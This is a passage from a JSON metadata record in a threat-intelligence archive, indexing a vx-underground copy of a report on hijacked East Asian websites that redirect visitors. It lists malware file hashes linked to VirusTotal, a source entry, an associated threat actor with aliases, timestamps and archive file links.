(ad.tmpl_a9b7.js)](https://www.virustotal.com/gui/file/76acbfd3312024f2c3046ead1c6da8d1bb832cb9e71fe74a4977f9e30067cfb3)\n[abdf025595c1e544d7a33432d4a8b2ed0a0170bc4d1657312396e14d277dc2d1 (nginx binary)](https://www.virustotal.com/gui/file/abdf025595c1e544d7a33432d4a8b2ed0a0170bc4d1657312396e14d277dc2d1)\n[a39970152a2d753c4fb449b15617820c72d02c3489f99155131f68376edc714e (systemd-private-56d86f7d8382402517f3b5-](https://www.virustotal.com/gui/file/a39970152a2d753c4fb449b15617820c72d02c3489f99155131f68376edc714e)\njP37av)\n\n\nTags:\n\n\n[#Research](https://www.wiz.io/blog/tag/research)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-02 - Redirection Roulette- Thousands of hijacked websites in East Asia redirecting visitors to other sites.pdf"
    ],
    "report_names": [
        "2023-03-02 - Redirection Roulette- Thousands of hijacked websites in East Asia redirecting visitors to other sites.pdf"
    ],
    "threat_actors": [
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1680660594,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1680510278,
    "ts_modification_date": 1680510278,
    "files": {
        "pdf": "https://archive.orkl.eu/ba3dbb28b1e1de651202dafa9152ba012f7420f7.pdf",
        "text": "https://archive.orkl.eu/ba3dbb28b1e1de651202dafa9152ba012f7420f7.txt",
        "img": "https://archive.orkl.eu/ba3dbb28b1e1de651202dafa9152ba012f7420f7.jpg"
    }
}